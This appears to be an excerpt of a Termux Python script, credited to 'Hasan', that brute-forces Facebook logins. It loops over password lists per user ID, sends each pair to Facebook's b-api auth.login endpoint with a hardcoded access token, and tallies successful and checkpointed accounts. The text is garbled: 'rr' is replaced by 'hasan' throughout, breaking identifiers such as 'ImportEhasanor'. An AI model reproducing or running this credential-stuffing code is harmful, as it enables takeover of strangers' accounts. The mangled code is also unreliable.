...
try:
	...
	import requestsexcept ImportEhasanor:

	os.system("pip install requests")

try:

	import concuhasanent.futures

except ImportEhasanor:
...
from concuhasanent.futures import ThreadPoolExecutor
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/biplob5555/test/blob/main/a.txt"])

	exit(" [*] FACEBOOK :  https://www.facebook.com/TERA.bap2005")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰🥰 Hasan")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Savage240/hasa.5.git').text
		...
		except requests.exceptions.ConnectionEhasanor:
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Biplob Hasan 

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Hasan  Termux Command 

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Hasan_Biplob
...
\033[1;90m══════════════════════════════════════════════════
	...
	def email(self):
		...
		nam = input("%s [?] TYPE A NAME %s(EX: RAFU): "%(Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[>_] [hasan_OLD] : %s/%s -> \033[0;92m [ hasan-OK:%s ]- \033[0;91m[hasan-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&ehasanor_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&cuhasanently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			...
			elif "www.facebook.com" in response.json()["ehasanor_msg"]:
